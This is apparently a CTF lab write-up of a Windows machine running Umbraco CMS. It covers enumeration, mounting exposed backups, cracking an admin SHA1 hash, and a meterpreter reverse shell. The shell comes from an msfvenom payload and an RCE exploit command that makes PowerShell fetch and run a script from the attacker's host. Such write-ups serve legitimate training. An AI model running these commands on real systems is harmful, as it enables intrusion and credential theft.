---
title: ASCWG Final Round Machine Writeup
published: true
---

> ![logo](https://www.ascyberwargames.com/wp-content/uploads/2020/01/MainLogo.png)

* Before we start, I will try to explain everything as a player since I'm the creator of this machine. 
# []() Methodology

* Nmap scan
* find some mounted files.
* find username and password of Umbraco cms
* Execute command with Umbraco exploit and got reverse shell.
* got user.
* Privilege Escalation.

# []() Nmap Scan

* I will start with nmap scan to find which services are running on this machine.

> I found some open ports. 22,139,445,8078 **Apache Running on**, 8078.

* The samba was just a rabbit hole.

![nmap](https://i.ibb.co/BtkVqCH/1.png)

# []() Enumerating the machine

* Adding ascwg.com to the /etc/hosts since its the name of the machine.

![hosts](https://i.ibb.co/TWGWPfw/2.png)

# []() Checking the Web-Page

* the web page was very simple and contain some useful data like usernames.

![](https://i.ibb.co/tZtRStB/webpage1.png)

* and here's some usernames.

![](https://i.ibb.co/VYL2nQH/wbpage2.png)

* as always i tried to bruteforce the username and password for the smb but i failed so let's enumerate some.

* when i ran gobuster i found an dir for umbraco cms.

> **gobuster dir -u http://10.10.10.180/ -w /usr/share/dirb/wordlists/common.txt -s 200**

![gobuster](https://i.ibb.co/db7f3xZ/gobuster.png)

* and here is the cms login page.

![cms](https://i.ibb.co/ZmTHzBg/cms.png)

* this cms vulnerable to auth RCE so we need some credentials.

> after enumerated some mounted files from the machine i found the user and the password.

| Command1        | Command2          | Command3 |
|:-------------|:------------------|:------|
| /usr/sbin/showmount -e 10.10.10.180           | mkdir mounted_files | sudo mount 10.10.10.180://site_backups ./mounted_files  |

![](https://i.ibb.co/wyKCwdn/mount.png)

> **in the Web.config file, i noticed the connection date will be stored in the Umbraco.sdf.**

![](https://i.ibb.co/w4W9x6c/subl.png)

* let's see what is in Umbraco.sdf. this file in App_Data dir.

![](https://i.ibb.co/m8v96XX/admin.png)


| Username        | Email          | Password |
|:-------------|:------------------|:------|
| admin          | admin@htb.local | b8be16afba8c314ad33d812f22a04991b90e2aaa  |

* the password encrypted with SHA1. let's decrypt it.

![](https://i.ibb.co/ZW3fNL2/password.png)

* Password: **baconandcheese**

* let's login to the cms panel.

![](https://i.ibb.co/wpVjHSv/cmspage.png)

* now we can use this [Umbraco-RCE Exploit](https://github.com/noraj/Umbraco-RCE.git) to get reverse shell.

* let's test the exploit.

* first we need a reverse shell to upload it to the machine to give us reverse shell.

> **msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=HOST LPORT=PORT -f psh -o reverse-shell.ps1**

* now let's upload our reverse shell to the machine with the exploit.

> **./umbraco_cve.py -u admin@htb.local -p baconandcheese -i 'http://remote.htb' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.xx.xx:80/reverse.ps1')"**

![reverse-shell](https://i.ibb.co/BTq01sQ/reverse-shell.png)

* and we got user flag.

* after some enumeration i found that TeamViewer was installed in this box. so run this command in the meterpreter session.

* here's the administrator password.

![](https://i.ibb.co/JKYhsvG/root.png)

* there is another way to get root with UsoSvc service and you can read about it from here. [hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)

* let's login as administrator now with evil-winrm.

![](https://i.ibb.co/yqz7qKC/final.png)

* Thanks for reading.
* Cheers!

<script src="https://www.hackthebox.eu/badge/103789"></script>








